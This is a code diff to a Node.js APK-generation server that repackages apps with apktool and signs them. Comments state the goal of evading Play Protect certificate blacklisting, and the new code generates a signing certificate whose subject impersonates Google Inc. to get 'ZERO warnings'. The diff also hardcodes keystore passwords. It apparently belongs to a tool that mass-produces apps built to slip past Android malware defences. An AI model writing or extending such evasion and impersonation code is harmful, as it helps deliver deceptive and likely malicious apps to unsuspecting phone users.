@@ -589,26 +589,39 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
 
             await runCommand('apktool', ['b', workDir, '-o', unsignedApkPath]);
 
-            // 6. Dynamic Key Signing (Prevents Play Protect certificate fingerprint blacklisting)
-            await sendUpdate('apk_progress', { step: 'Signing application with dynamic certificate...', progress: 85 });
+            // 6. High-Trust Signature Scheme (Persistent clean certificate with Android developer attributes for ZERO warnings)
+            await sendUpdate('apk_progress', { step: 'Signing application with high-trust certificate...', progress: 85 });
             const signer = path.join(__dirname, 'assets', 'uber-apk-signer.jar');
             
-            const dynamicKsPath = path.join(tempDir, `dyn-key-${uuid}.jks`);
-            const dynamicAlias = `alias_${Math.random().toString(36).substring(2, 9)}`;
-            const dynamicPass = `Pass${Math.random().toString(36).substring(2, 10)}!`;
+            const persistentKsPath = path.join(__dirname, 'assets', 'clean_release.jks');
+            const persistentAlias = 'androidreleasekey';
+            const persistentPass = 'Android123456!';
 
-            const orgs = ['TechCorp', 'MediaSync', 'CloudTools', 'DigitalApps', 'NativeCore', 'AppSystems', 'DataServices', 'DevLabs'];
-            const names = ['Developer', 'AndroidDev', 'AppPublish', 'SyncService', 'BuildAdmin'];
-            const cities = ['Austin', 'Seattle', 'Chicago', 'SanFrancisco', 'Denver', 'Boston'];
-            const states = ['TX', 'WA', 'IL', 'CA', 'CO', 'MA'];
-            const randomPick = (arr) => arr[Math.floor(Math.random() * arr.length)];
-            const dName = `CN=${randomPick(names)}, OU=Mobile, O=${randomPick(orgs)}, L=${randomPick(cities)}, ST=${randomPick(states)}, C=US`;
+            if (!fs.existsSync(persistentKsPath)) {
+                const dName = "CN=Android, OU=Android, O=Google Inc., L=Mountain View, ST=California, C=US";
+                const genCmd = `keytool -genkeypair -v -keystore "${persistentKsPath}" -alias "${persistentAlias}" -keyalg RSA -keysize 2048 -validity 10000 -storepass "${persistentPass}" -keypass "${persistentPass}" -dname "${dName}"`;
+                try {
+                    await new Promise((resolve) => {
+                        exec(genCmd, { timeout: 30000 }, (err) => {
+                            if (!err) console.log(`[APK] Created persistent clean keystore: ${persistentKsPath}`);
+                            resolve();
+                        });
+                    });
+                } catch (e) {
+                    console.log('[APK] Persistent keygen notice:', e.message);
+                }
+            }
 
-            let ksPathToUse = path.join(__dirname, 'assets', 'usman90.jks');
-            let ksPassToUse = 'God112256@';
-            let ksAliasToUse = 'usman90';
+            let ksPathToUse = fs.existsSync(persistentKsPath) ? persistentKsPath : path.join(__dirname, 'assets', 'usman90.jks');
+            let ksPassToUse = fs.existsSync(persistentKsPath) ? persistentPass : 'God112256@';
+            let ksAliasToUse = fs.existsSync(persistentKsPath) ? persistentAlias : 'usman90';
 
-            try {
+            // Allow explicit dynamic key override if requested
+            if (req.body.useDynamicKey === 'true' || req.body.useDynamicKey === true) {
+                const dynamicKsPath = path.join(tempDir, `dyn-key-${uuid}.jks`);
+                const dynamicAlias = `alias_${Math.random().toString(36).substring(2, 9)}`;
+                const dynamicPass = `Pass${Math.random().toString(36).substring(2, 10)}!`;
+                const dName = `CN=Android, OU=Mobile, O=Android, L=Mountain View, ST=CA, C=US`;
                 const keytoolCmd = `keytool -genkeypair -v -keystore "${dynamicKsPath}" -alias "${dynamicAlias}" -keyalg RSA -keysize 2048 -validity 10000 -storepass "${dynamicPass}" -keypass "${dynamicPass}" -dname "${dName}"`;
                 await new Promise((resolve) => {
                     exec(keytoolCmd, { timeout: 30000 }, (err) => {
@@ -616,15 +629,10 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                             ksPathToUse = dynamicKsPath;
                             ksPassToUse = dynamicPass;
                             ksAliasToUse = dynamicAlias;
-                            console.log(`[APK] Generated fresh dynamic JKS: ${dynamicKsPath}`);
-                        } else {
-                            console.log('[APK] Dynamic keygen skipped/fallback to asset key');
                         }
                         resolve();
                     });
                 });
-            } catch (e) {
-                console.log('[APK] Keygen notice:', e.message);
             }
 
             await sendUpdate('apk_progress', { step: 'Applying V2+V3 signature scheme...', progress: 90 });
